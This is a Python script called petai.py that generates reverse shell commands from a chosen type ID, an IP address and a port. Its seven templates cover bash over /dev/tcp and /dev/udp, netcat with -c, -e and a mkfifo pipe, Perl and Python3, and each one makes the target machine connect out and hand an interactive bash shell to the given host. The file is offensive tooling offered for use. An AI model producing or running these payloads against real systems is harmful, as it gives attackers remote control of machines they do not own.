#!/usr/bin/python3

import sys

def reverse_shell_list():
    print("- [Reverse Shell Type] -")
    print("ID   |       Reverse Shell")
    print("=====+===============================")
    print(" 1   |       bash -i TCP")
    print(" 2   |       bash -i UDP")
    print(" 3   |       nc -c")
    print(" 4   |       nc -e")
    print(" 5   |       nc mkfifo")
    print(" 6   |       perl")
    print(" 7   |       python3")


def help_me():
    print("Usage: petai.py [--help] [Options] [Type]")
    print("Exa: petai.py -r 1 -i 10.10.10.10 -p 9901")
    print("")
    print("OPTIONS:")
    print("-r <reverse_shell_id>:       Reverse Shell ID")
    print("-i <ip_address>:             Ip address")
    print("-p <port_for_listening>:     Port")
    print("")
    print("NICE OPTIONS:")
    print("--help:      show help")
    print("--list:      list all reverse shell [ID]")

def reverse_shell(shell_id, user_ip, user_port):
    if shell_id == '1':
        print(f"bash -i >& /dev/tcp/{user_ip}/{user_port} 0>&1")
    elif shell_id == '2':
        print(f"bash -i >& /dev/udp/{user_ip}/{user_port} 0>&1")
    elif shell_id == '3':
        print(f"nc -c /bin/bash {user_ip} {user_port}")
    elif shell_id == '4':
        print(f"nc -e /bin/bash {user_ip} {user_port}")
    elif shell_id == '5':
        print(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {user_ip} {user_port} >/tmp/f")
    elif shell_id == '6':
        print("perl -e 'use Socket;$i=" + f'"{user_ip}"' + f";$p={user_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname" + '("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,' + '">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");' + "};'")
    elif shell_id == '7':
        print("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + f'"{user_ip}",{user_port}' + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(" + '"/bin/bash"' + ")'")
    else:
        print("Invalid Arguments")


if __name__ == "__main__":
    try:
        if sys.argv[1] == "--help":     #help
            help_me()
        elif sys.argv[1] == "--list":   #list
            reverse_shell_list()
        elif sys.argv[1] == "-r":       #reverse shell
            try:
                revshell = sys.argv[2]          #reverse shell id
                try: 
                    sys.argv[3] == "-i"     #ip address
                    try:
                        if sys.argv[5] == "-p":
                            user_ip = sys.argv[4]       #user input ip address
                            user_port = sys.argv[6]     #user input listening port
                            reverse_shell(revshell, user_ip, user_port)
                        else:
                            print("Missing An Arguments")
                    except:
                        print("Missing An Arguments")
                except:
                    print("Missing An Arguments")
            except:
                print("Missing an Arguments")
        else:
            print("Hmmmm It's seems wrong'")

    except:
        print("Usage: petai.py [--help] [Options] [Type]")
        print("")
        print("Error: Sorry, Try This '--help'")


